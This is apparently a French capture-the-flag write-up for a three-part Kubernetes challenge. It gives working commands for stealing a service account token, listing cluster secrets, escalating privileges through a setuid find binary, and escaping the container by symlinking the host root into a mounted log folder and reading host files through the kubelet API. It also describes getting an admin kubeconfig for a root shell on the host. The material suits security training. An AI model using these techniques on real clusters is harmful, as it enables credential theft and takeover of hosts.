# Les nuages menaçants

## 1ère partie

### Intitulé

Vous prenez une pause bien méritée et vous vous asseyez à une table. Vous regardez les nuages quand un homme s'approche de vous :

« Vous aussi les nuages vous passionnent ? Je vous proposerai bien une madeleine, mais c'est ma dernière... Mais j'oublie l'essentiel : je suis Marcel Proust. »

Il prend quelques minutes pour contempler les nuages, puis il reprend :

« Les nuages m'ont toujours passionné... J'ai entendu parler d'un nouveau type de nuage récemment, pouvez-vous me donner ses secrets ? »

Connectez-vous au nuage avec le mot de passe suivant : 4GqWrNkNuN

Le challenge peut prendre quelques minutes à se lancer.

### Solution

On récupère d'abord le token k8s et les certificats et l'apiserver :

```sh
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
```

On récupère les permissions associées :
```sh
curl --cacert $CACERT --header "Authorization: Bearer $TOKEN" -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
    "https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```

On énumère les namespaces :
```sh
curl --cacert $CACERT --header "Authorization: Bearer $TOKEN" https://$APISERVER/api/v1/namespaces
```

Puis on récupère les secrets du namespace `404ctf` où se trouve le flag. On remarque aussi des identifiants que l'on note.
```sh
curl --cacert $CACERT --header "Authorization: Bearer $TOKEN" https://$APISERVER/api/v1/namespaces/404ctf/secrets
```

## 2ème partie

### Intitulé

Après avoir trouvé les secrets du nuage, vous les racontez à Proust. Celui-ci vous demande alors d'aller explorer le nuage plus en profondeur.

Connectez-vous au nuage avec le mot de passe suivant : 4GqWrNkNuN

Le challenge peut prendre quelques minutes à se lancer.

Le flag est dans /flag.txt.

### Solution

On remarque que nmap est installé. On récupère le réseau du cluster avec `ip a` puis on scanne le réseau avec `nmap qui est installé`

On remarque qu'il y a un service ssh, on se connecte dessus avec les identifiants récupérés puis on récupère le flag.

## 3ème partie

### Intitulé

Après avoir exploré tous les recoins du nuage, Proust s'exclame :

« Pouvez-vous en prendre le contrôle ? J'ai toujours voulu pouvoir diriger les nuages !

Connectez-vous au nuage avec le mot de passe suivant : 4GqWrNkNuN

Le challenge peut prendre quelques minutes à se lancer.

Le flag est dans /flag.txt sur l'hôte directement.

### Solution

Ici le but est de s'échapper du conteneur sur l'hôte.

On récupère à nouveau le token, les cacerts. On remarque le token à les droits sur log et node/log.

En fouillant, on remarque un dossier suspect `/var/host/log`. Il s'agit du dossier `/var/log` de l'hôte qui est monté en lecture/écriture sur le conteneur. Cela va être notre point d'attaque.

D'abord, on passe root. On remarque que `find` est en `setuid` ce qui nous permet de passer root (cf gtfobins).

A partir de là, on crée un lien symbolique :
```sh
ln -s / /var/host/log/sym
```

Cela va nous permettre, en exploitant l'api de kubelet, de lire n'importe quel fichier sur l'hôte et notamment le flag :
```sh
curl -k --header "Authorization: Bearer $TOKEN" https://10.42.x.1:10250/logs/sym/flag.txt
```

### Bonus

On peut récupérer un kubeconfig admin qui est à `/etc/rancher/k3s/k3s.yaml` qui nous permet de faire ce que l'on veut et notamment de déployer un pod privilégié pour ensuite s'en échapper et obtenir un shell root sur l'hôte.